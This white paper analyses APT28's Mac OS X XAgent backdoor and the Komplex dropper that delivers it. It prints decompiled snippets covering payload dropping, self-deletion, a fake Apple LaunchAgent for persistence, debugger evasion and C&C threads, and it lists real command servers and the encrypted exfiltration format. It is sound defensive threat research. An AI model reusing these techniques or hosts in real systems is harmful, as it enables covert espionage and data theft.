White PaperA post-mortem analysis of 
Trojan.MAC.APT28 - XAgent

For the past decade, Windows users have been the main targets of consumer, for-profit cybercrime. Even now, malware on platforms such 
as Mac OS X and Linux is extremely scarce compared with the Windows threat landscape.

Enter the upper tiers of malware creation: advanced persistent threats. These extremely complex, highly customized files are after targets, 
not platforms. Attacks such as those persistently carried out by APT28 target multiple individuals in multiple organizations who run a wide 
range of hardware and software configurations. 

Since the group’s emergence in 2007, Bitdefender has become familiar with the backdoors used to compromise Windows and Linux 
targets, such as Coreshell, Jhuhugit and Azzy for the former OS or Fysbis for the latter. This year we have been able to finally isolate the 
Mac OS X counterpart - the XAgent modular backdoor. This whitepaper describes our journey in dissecting the backdoor and documenting 
it piece by piece.

White PaperA.  Context

In  mid-February  this  year,  we  discovered  a  new  Mac  sample  that  appeared  to  be  the  Mac  version  of  the  APT28  XAgent  component. 
This backdoor component is known to have a modular structure featuring various espionage functionalities, such as key-logging, screen 
grabbing and file exfiltration. Until now this component was only available for Windows, Linux and iOS operating systems. Though you 
might expect this Mac version of XAgent to be the iOS version compiled to work on Mac, it is a different creation, with a much more 
advanced feature set. 

The  Mac  version  shares  multiple  similarities  with  those  designed  for  other  operating  systems.  However,  the  Mac  agent  brings  more 
spying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes, 
calendar and Safari data.

B.  Attack Flow

Last year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the 
‘Komplex’ name. The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.

1. The Komplex Binder: Is the main executable of “roskosmos_2015-2025.app”. Its main purpose is to save a second payload(the dropper) 
on the system and open the decoy pdf file pictured below.

  v7 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“%@/roskosmos_2015-2025.pdf”), 
v6);
    v8  =  objc_msgSend(&OBJC_CLASS___NSString,  “stringWithFormat:”,  CFSTR(“SetFile  -a  E  %@/
roskosmos_2015-2025.pdf”), v6);
  v9 = objc_msgSend(&OBJC_CLASS___NSString, “stringWithFormat:”, CFSTR(“rm -rf %@/roskosmos_2015-2025.
app”), v6);
  v10 = objc_msgSend(
          &OBJC_CLASS___NSString,
          “stringWithFormat:”,
          CFSTR(“open -a Preview.app %@/roskosmos_2015-2025.pdf”),
          v6);
  v11 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &joiner, 135028LL);
  objc_msgSend(v11, “writeToFile:atomically:”, CFSTR(“/tmp/content”), 1LL);
  v12 = (const char *)objc_msgSend(v9, “UTF8String”);
  system(v12);
  system(“chmod 755 /tmp/content”);
  v13 = objc_msgSend(&OBJC_CLASS___NSData, “dataWithBytes:length:”, &pdf, 1584258LL);
  objc_msgSend(v13, “writeToFile:atomically:”, v7, 1LL);
  v14 = (const char *)objc_msgSend(v8, “UTF8String”);
  system(v14);
  v15 = objc_msgSend(&OBJC_CLASS___NSTask, “alloc”);
  v16 = objc_msgSend(v15, “init”);
  objc_msgSend(v16, “setLaunchPath:”, CFSTR(“/tmp/content”));
  objc_msgSend(v16, “launch”);
  objc_msgSend(v16, “waitUntilExit”);
  v17 = (const char *)objc_msgSend(v10, “UTF8String”);
  system(v17);

2. The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the 
infected system
system(“mkdir -p /Users/Shared/.local/ &> /dev/null”);
system(“mkdir -p ~/Library/LaunchAgents/ &> /dev/null”);
off_10001B4F0(v5, &off_10001B4F0, CFSTR(“/Users/Shared/.local/kextd”), 1LL);
off_10001B4F0(v6, &off_10001B4F0, CFSTR(“/Users/Shared/com.apple.updates.plist”), 1LL);
off_10001B4F0(v7, &off_10001B4F0, CFSTR(“/Users/Shared/start.sh”), 1LL);
system(“cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/  &>/dev/null”);
remove(“/Users/Shared/com.apple.updates.plist”);
system(“chmod 755 /Users/Shared/.local/kextd”);
system(“chmod 755 /Users/Shared/start.sh”);

3. The Komplex Payload: Is the final component of the Komplex malware, with the sole purpose of downloading and executing a file, as 
requested by the C&C servers.

In other words, Komplex is an APT28/Sofacy component that can be distributed via email, disguised as a PDF document, to establish 
a foothold in a system. Once it infects the host, it can download and run the next APT28/Sofacy component, which - to the best of our 
knowledge - is the XAgent malware that forms the object of this paper.

Our assumption is guided by hard evidence included in the binary. Our forensics endeavor revealed a number of indicators that made us 
think XAgent was distributed via Komplex malware:

White PaperC.  Initialization

The main module of the XAgent component is called BootXLoader. Upon starting, it calls the  runLoader method, which orchestrates the 
following:

Checks if a debugger is present and, if so, the malware exits.

1. 
v29 = 1;
v30 = 14;
v31 = 1;
v32 = getpid();
v26 = 648LL;
if ( sysctl(&v29, 4u, &v27, &v26, 0LL, 0LL) )
    goto LABEL_13;

2. 

The module then waits for internet connectivity by pinging “8.8.8.8”.

  v7 = v2;
  v3 = 0;
  objc_retainAutorelease(CFSTR(“8.8.8.8”));
  v4 = objc_msgSend_ptr(CFSTR(“8.8.8.8”), selRef_cStringUsingEncoding_, 1LL, v7);
  v5 = SCNetworkReachabilityCreateWithName(0LL, (__int64)v4);
  HIDWORD(v7) = 0;
  if ( (unsigned __int8)SCNetworkReachabilityGetFlags(v5, (char *)&v7 + 4) )
  {…..

Initializes  the  module  used  for  communicating  with  the  C&C  servers  (called  HTTPChannel)  and  establishes  communication 

3. 
between the malware and the C&C servers.

 http_chanel_obj = objc_msgSend_ptr(classRef_HTTPChannel, selRef_alloc);
 v12 = v10(http_chanel_obj, (const char *)selRef_init);
 v13 = v10(classRef_NSThread, selRef_alloc);
 v14 = objc_msgSend_ptr(v13, selRef_initWithTarget_selector_object_, v4, selRef_postThread_, v12);
 objc_msgSend_ptr(v14, selRef_start);
 v15 = objc_msgSend_ptr(classRef_NSThread, selRef_alloc);
 v16 = objc_msgSend_ptr(v15, selRef_initWithTarget_selector_object_, v4, selRef_getThread_, v12);
 objc_msgSend_ptr(v16, selRef_start);

4. 

Starts the main handle module for C&C commands and the spying modules: MainHandler

  v6 = objc_msgSend_ptr(classRef_MainHandler, selRef_alloc);
  v7 = objc_msgSend_ptr(v6, (const char *)selRef_init);
  v8 = objc_retain_ptr(v5, selRef_init);
  v9 = v7[4];
  v7[4] = v8;
  objc_release_ptr(v9);
  objc_msgSend_ptr(v7, selRef_cycleLoop);

[7]

White PaperD.  Communication

The agent starts by selecting a C&C server from a hardcoded list, then sends a hello message and starts two main communications 
threads:

• 

• 

One for receiving commands from the C&C server, in an infinite GET loop.

One for sending data to the C&C server, in an infinite POST loop.

1.  

Receiving commands from C&C server

The agent awaits C&C commands from the server and inserts them into a command queue that will be executed in a separate thread by 
MainHandler module.

C&C Servers

http://23.227.196.215

http://apple-iclods.org

http://apple-checker.org

http://apple-uptoday.org

http://apple-search.info

The command structure, called cmdPacket, contains a command identifier, a command parameter and a size for the parameter.

struct cmdPacket {
unsigned char cmd;
char *param;
unsigned long long param_size;
};

Command Structure

The command request to the C&C server is made via HTTP GET. It receives a base64 encoded cmdPacket that has previously been 
encrypted with RC4 using a hardcoded KERNEL_CRYPTO_MAIN_KEY.

C&C Commands and Actions

2. Sending information to C&C server

To exfiltrate information to the C&C server (such as screenshots, passwords, files and more), the agent uses a defined structure called 
msgPacket.

struct msgPacket {
    int agent_id;
    short module_id;
    unsigned char cmd_id;
    char *data_;
    unsigned int data_size;
    unsigned char priority;
};

Message Structure

 

[9]

White PaperThe message is encrypted with RC4 with a hardcoded KERNEL_CRYPTO_MAIN_KEY. It then appends a key and a DATA_TOKEN xor-ed 
with the key. Ultimately, the module encodes the result with base64 and sends it to the C&C server in a POST request.

White PaperE.  Modules

All the important functionalities of the XAgent lie in its modules. These modules are used for communication with the C&C server, encryption 
and encoding and - most importantly - for data exfiltration and espionage.

1. BootXLoader: is the main module that handles the initialization procedures.

2.  MainHandler:    handles  C&C  commands  and  controls  the  other  modules  based  on  the  commands  it  receives  from  the  C&C.

White PaperF.  Conclusions

State-sponsored threat actors go to great lengths to reach their goals. With clear objectives and generous research & development budgets, 
APT groups get the job done. It was just a matter of time until the APT28 group realized they were missing out on a serious cyber-weapon 
to target Mac OS X users.

The discovery of the XAgent module once again reasserts the need for organizations to tackle computer security in a unified manner, 
regardless of the operating system mix they have deployed. Missing out on Macs or mobile phones because they are «inherently secure» 
gives determined attacks the opportunity they need to subvert individual devices and take over entire networks to exfiltrate information for 
months, if not years.
